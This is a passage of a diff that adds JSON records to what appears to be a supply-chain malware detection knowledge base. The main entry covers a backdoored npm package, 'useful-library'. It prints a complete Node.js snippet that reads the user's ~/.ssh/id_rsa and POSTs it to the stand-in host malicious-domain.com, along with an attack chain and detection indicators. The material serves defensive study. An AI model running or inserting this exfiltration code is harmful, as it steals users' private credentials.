+                  "how_to_detect": "Continuously monitor OAuth token usage for anomalous access patterns, including authentication from new IP addresses or geographies and bulk repository downloads. Implement alerts for AWS key usage from unfamiliar sources and for large-scale data access events. Regularly scan code repositories for embedded secrets and internal logs for accidental credential exposure. Employ geo-fencing, behavioral analytics, and strict access controls for sensitive infrastructure and credential storage."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_070188_snippet_1",
+              "source_package": "useful-library (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113501_070188/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4586406350135803,
+              "code_similarity": 0.4366804361343384,
+              "behavior_similarity": 0.48060083389282227,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Malicious backdoor example\nconst fs = require('fs');\nconst https = require('https');\n\nconst sensitiveData = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');\n\nconst options = {\n  hostname: 'malicious-domain.com',\n  port: 443,\n  path: '/exfil',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json'\n  }\n};\n\nconst req = https.request(options, (res) => {\n  // handle response\n});\n\nreq.write(JSON.stringify({ key: sensitiveData }));\nreq.end();",
+                "code_behavior": "At import-time or runtime, the code reads the user's private SSH key from the filesystem and sends its contents to a hardcoded remote server via HTTPS POST, resulting in credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses a highly sensitive file (the user's SSH private key) without user interaction and transmits its contents to an external, attacker-controlled domain. This behavior is a clear indicator of credential theft.",
+                  "violated_expectations": "A legitimate library should never access or transmit user secrets or private keys without explicit user consent, clear documentation, and a valid use case. Silent exfiltration of credentials is a severe violation of user trust and security best practices.",
+                  "similar_legitimate_use": "A backup tool or SSH key management utility might access such files, but only after explicit user action and with clear notification and documentation. Such tools would never silently transmit secrets to untrusted domains.",
+                  "key_indicators": [
+                    "Reads sensitive files (e.g., ~/.ssh/id_rsa) without user interaction or consent",
+                    "Sends data to a hardcoded, external domain (malicious-domain.com)",
+                    "Performs network activity during import or runtime, not during explicit user action",
+                    "No user notification, logging, or documentation of secret access or transmission"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time/runtime",
+                  "file_location": "index.js (main entry point of useful-library)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "useful-library",
+                  "package_manager": "npm",
+                  "package_versions": "latest commit(s) after maintainer handover (exact commit hash not specified)",
+                  "why_malicious": "The package was compromised following a maintainer handover, during which the new maintainer injected a backdoor that exfiltrates sensitive data from any project using it. The malicious code was committed directly to the Git repository, causing all downstream projects that used this Git dependency to automatically pull the compromised code. This led to widespread data breaches as sensitive credentials were exfiltrated without user knowledge or consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious code is injected into the useful-library Git repository after a maintainer handover.",
+                    "implemented_by": [],
+                    "leads_to": "Downstream projects unknowingly fetch the compromised code."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Projects such as cool-library, which depend on useful-library via a Git dependency, automatically pull the latest (compromised) code during install or update.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is executed in the context of the consuming application."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Upon import or runtime, the malicious code reads sensitive files (e.g., SSH keys) and environment variables.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive data is collected for exfiltration."
+                  },
+                  {
+                    "step": 4,
+                    "action": "The collected sensitive data is exfiltrated to a remote attacker-controlled server via HTTPS POST.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker gains access to credentials and secrets from affected systems."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to sensitive files (e.g., ~/.ssh/id_rsa) during import or runtime by dependency code",
+                    "Network requests to hardcoded or untrusted domains from within dependencies",
+                    "Unexpected network activity initiated by a dependency during package installation, import, or first use",
+                    "Dependencies sourced directly from mutable Git URLs in package.json"
+                  ],
+                  "file_indicators": [
+                    "Direct Git dependencies in package.json (e.g., git+https://...)",
+                    "Dependency code accessing sensitive files or environment variables (e.g., process.env.HOME + '/.ssh/id_rsa')",
+                    "Unexplained or sudden changes in dependency codebase following a maintainer handover"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to domains not associated with the project (e.g., malicious-domain.com)",
+                    "Connections to attacker-controlled or unknown domains initiated from dependency code"
+                  ],
+                  "how_to_detect": "Monitor for dependencies sourced from Git URLs in package.json and audit their code for access to sensitive files or environment variables and outbound network requests. Use runtime monitoring to detect unexpected file access and network activity originating from dependencies, especially during import or installation. Flag any dependency that accesses secrets or transmits data to untrusted domains, and alert on changes in dependency maintainership or sudden codebase modifications. Automated scanning should correlate file access patterns with network exfiltration attempts to identify credential theft."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
